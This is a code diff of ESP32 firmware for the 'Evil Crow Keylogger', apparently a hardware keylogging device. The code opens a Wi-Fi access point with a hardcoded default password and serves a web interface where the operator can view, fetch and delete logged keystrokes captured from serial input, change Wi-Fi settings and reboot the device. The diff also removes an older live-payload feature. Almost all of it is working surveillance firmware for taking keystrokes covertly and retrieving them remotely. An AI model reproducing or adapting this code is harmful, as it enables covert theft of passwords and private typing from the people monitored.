@@ -2,116 +2,221 @@
 #include <WiFiClient.h>
 #include <WiFiAP.h>
 #include <WebServer.h>
-#include <EEPROM.h>
+#include <ESPmDNS.h>
 #include "SPIFFS.h"
-#include "livepayload.h"
+#include "index.h"
+#include "viewlog.h"
+#include "config.h"
+#include "javascript.h"
+#include "style.h"
 
-String webString;
-char autopayload[64];
-int DelayLength = 1000;
-int livepayloaddelay;
-char local_IPstr[16];
-
-// Config SSID and password
-const char* ssid = "Keylogger";  // Enter your SSID here
-const char* password = "123456789";  //Enter your Password here
-
-// HTML and CSS style
-const String HTML_CSS_STYLING = "<html><head><meta charset=\"utf-8\"><title>Evil Crow Keylogger</title><style>     body {     background-color: #333333;     font-family: \"Century Gothic\", Arial;     color: white;     margin: 20px;}.myButton:link, .myButton:visited {background: linear-gradient(#777777, #444444);color: white;padding: 4px;min-width: 100px;border-radius: 5px;border: 2px solid white;text-align: center;margin-right: 20px;text-decoration: none;display: inline-block;transition: 0.25s;}  .myButton:hover, .myButton:active {background: linear-gradient(#888888, #555555);border: 2px solid deepskyblue;border-radius: 10px;transform: scale(1.15);}</style></head>";
-const String MENU = "<body><p>Evil Crow Keylogger v1.5</p><div id=\"header\"><div id=\"menu\"><ul><a class=\"myButton\" href=\"/\">Menu</a><a class=\"myButton\" href=\"/livepayload\">Live Payload</a><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a></ul></div></div></style>";
+// Config SSID, password and hostname
+String defaultSSID = "Evil Crow Keylogger";
+String defaultPassword = "123456789ECKeylogger";
+String hostname = "evilcrow-keylogger";
 
 // File
 File logs;
 
 // Web Server
-WebServer server(80);
-
+String webString;
+char local_IPstr[16];
 const bool formatOnFail = true;
+WebServer controlserver(80);
+
+void enableWiFi() {
+  String wifiSSID = defaultSSID;
+  String wifiPassword = defaultPassword;
+
+  if (readWiFiConfig(wifiSSID, wifiPassword)) {
+    //Serial.println("Using saved Wi-Fi credentials.");
+  } else {
+    //Serial.println("Using default Wi-Fi credentials.");
+  }
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(wifiSSID.c_str(), wifiPassword.c_str());
+}
+
+void appendFile(fs::FS &fs, const char *path, const char *message, String messagestring) {
+  logs = fs.open(path, FILE_APPEND);
+  if (!logs) {
+    // Serial.println("Failed to open file for appending");
+    return;
+  }
+
+  if (logs.print(message) | logs.print(messagestring)) {
+    // Serial.println("Message appended");
+  } else {
+    // Serial.println("Append failed");
+  }
+
+  logs.close();
+}
+
+void deleteFile(fs::FS &fs, const char * path){
+  //Serial.printf("Deleting file: %s\n", path);
+  if(fs.remove(path)){
+    //Serial.println("File deleted");
+  } else {
+    //Serial.println("Delete failed");
+  }
+}
+
+bool readWiFiConfig(String &ssid, String &password) {
+  if (!SPIFFS.exists("/wifi_config.txt")) {
+    //Serial.println("Wi-Fi config file not found");
+    return false;
+  }
+
+  File file = SPIFFS.open("/wifi_config.txt", FILE_READ);
+  if (!file) {
+    //Serial.println("Failed to open Wi-Fi config file");
+    return false;
+  }
+
+  ssid = file.readStringUntil('\n');
+  ssid.trim();
+
+  password = file.readStringUntil('\n');
+  password.trim();
+
+  file.close();
+
+  if (ssid.length() == 0 || password.length() == 0) {
+    //Serial.println("Invalid Wi-Fi config (empty fields)");
+    return false;
+  }
+
+  //Serial.println("Wi-Fi config read successfully:");
+  //Serial.print("SSID: "); Serial.println(ssid);
+  //Serial.print("Password: "); Serial.println(password);
+  return true;
+}
+
+void handleUpdateWiFi() {
+  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
+    String newSSID = controlserver.arg("ssid");
+    String newPassword = controlserver.arg("password");
+
+    if (SPIFFS.exists("/wifi_config.txt")) {
+      SPIFFS.remove("/wifi_config.txt");
+    }
+
+    appendFile(SPIFFS, "/wifi_config.txt", newSSID.c_str(), "\n");
+    appendFile(SPIFFS, "/wifi_config.txt", newPassword.c_str(), "\n");
+    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config applied successfully! Device will restart.\"}");
+    delay(500);
+    ESP.restart();
+  } else {
+    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
+  }
+}
+
+void handleDeleteWiFiConfig() {
+  if (SPIFFS.exists("/wifi_config.txt")) {
+    if (SPIFFS.remove("/wifi_config.txt")) {
+      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config deleted successfully\"}");
+      ESP.restart();
+    } else {
+      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
+    }
+  } else {
+    controlserver.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Wi-Fi config file not found\"}");
+  }
+}
+
+void handleStats() {
+  size_t freeSpiffs = 0;
+
+  if (SPIFFS.begin(true)) {
+    freeSpiffs = SPIFFS.totalBytes() - SPIFFS.usedBytes();
+  }
+
+  String json = "{";
+  json += "\"uptime\":" + String(millis() / 1000);
+  json += ",\"cpu0\":" + String(getCpuFrequencyMhz());
+  json += ",\"cpu1\":" + String(getXtalFrequencyMhz());
+  json += ",\"temperature\":" + String(temperatureRead());
+  json += ",\"freespiffs\":" + String(freeSpiffs);
+  json += ",\"totalram\":" + String(ESP.getHeapSize());
+  json += ",\"freeram\":" + String(ESP.getFreeHeap());
+  json += "}";
+
+  controlserver.send(200, "application/json", json);
+}
 
 void setup() {
   Serial.begin(38400);
-  delay(500);
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP(ssid, password);
 
-  EEPROM.begin(4096);
   SPIFFS.begin(formatOnFail);
+
+  delay(2000);
+
+  enableWiFi();
+
+  if (!MDNS.begin(hostname.c_str())) {
+    //Serial.println("Error setting up MDNS responder!");
+  }
 
   logs = SPIFFS.open("/logs.txt", "a+");
 
-  server.on("/", []() {
-    server.send(200, "text/html", HTML_CSS_STYLING + MENU);
+  controlserver.on("/", []() {
+    controlserver.send(200, "text/html", Index);
   });
 
-  server.on("/livepayload", []() {
-    server.send_P(200, "text/html", LivePayload);
+  controlserver.on("/viewlog", []() {
+    controlserver.send(200, "text/html", ViewLog);
   });
-
-  server.on("/runlivepayload", [](){
-    String livepayload;
-    livepayload += server.arg("livepayload");
-    if (server.hasArg("livepayloadpresent")) {
-      char* splitlines;
-      int payloadlen = livepayload.length()+1;
-      char request[payloadlen];
-      livepayload.toCharArray(request,payloadlen);
-      splitlines = strtok(request,"\r\n");
-      int defaultdelay = DelayLength;
-      int settingsdefaultdelay = DelayLength;
-      int custom_delay;
-      delay(livepayloaddelay);
-      while(splitlines != NULL)
-      {
-         String liveline=splitlines;
-         liveline.replace("&lt;", "<");
-         char *i;
-         String cmd;
-         String cmdinput;
-         cmd = String(strtok_r(splitlines," ",&i));
-         
-         splitlines = strtok(NULL,"\r\n");       
-
-         Serial.println(liveline);        
-
-         delay(DelayLength);
-         DelayLength = defaultdelay;
-         cmd = ""; 
-         liveline = "";
-      }
-      DelayLength = settingsdefaultdelay;
-      return 0;
-    }
-    else {
-      server.send(200, "text/html", F("Type or Paste a payload and click \"Run Payload\"."));
-    }
-  });
-
-  server.on("/viewlog", [](){
+  
+  controlserver.on("/logs", [](){
     logs.close();
     String serverlog;
-    serverlog += server.arg(0);
+    serverlog += controlserver.arg(0);
     logs = SPIFFS.open("/logs.txt");
     webString = logs.readString();
     logs.close();
     logs = SPIFFS.open("/logs.txt", "a+");
-    server.send(200, "text/html", HTML_CSS_STYLING+ "View Log: "+serverlog +"\n-----\n"+webString+"</pre></h2>");
+    controlserver.send(200, "text/html", "View Log: "+serverlog +"\n-----\n"+webString);
     loop(); 
   });
 
-  server.on("/delete", [](){
-    logs.close();
-    logs = SPIFFS.open("/logs.txt", "w");
-    server.send(200, "text/plain", "File cleared!" );
-    webString="";
-    logs.close();
-    logs = SPIFFS.open("/logs.txt", "a+");
-    loop();
+  controlserver.on("/delete", []() {
+    deleteFile(SPIFFS, "/logs.txt");
+    controlserver.send(200, "application/json", "{\"status\":\"deleted\"}");
   });
-  server.begin();
+
+  controlserver.on("/config", [](){
+    controlserver.send(200, "text/html", Config);
+  });
+
+  controlserver.on("/updatewifi", handleUpdateWiFi);
+  controlserver.on("/deletewificonfig", handleDeleteWiFiConfig);
+  controlserver.on("/stats", handleStats);
+
+  controlserver.on("/reboot", []() {
+    controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Device rebooting\"}");
+    delay(200);
+    ESP.restart();
+  });
+
+  controlserver.on("/connectioncheck", []() {
+    controlserver.send(200, "application/json", "{\"status\":\"ok\"}");
+  });
+
+  controlserver.on("/javascript.js", []() {
+    controlserver.send(200, "text/javascript", Javascript);
+  });
+
+  controlserver.on("/style.css", []() {
+    controlserver.send(200, "text/css", Style);
+  });
+  
+  controlserver.begin();
 }
 
 void loop() {
-  server.handleClient();
+  controlserver.handleClient();
 
   if(Serial.available()) {
     logs.write(Serial.read());
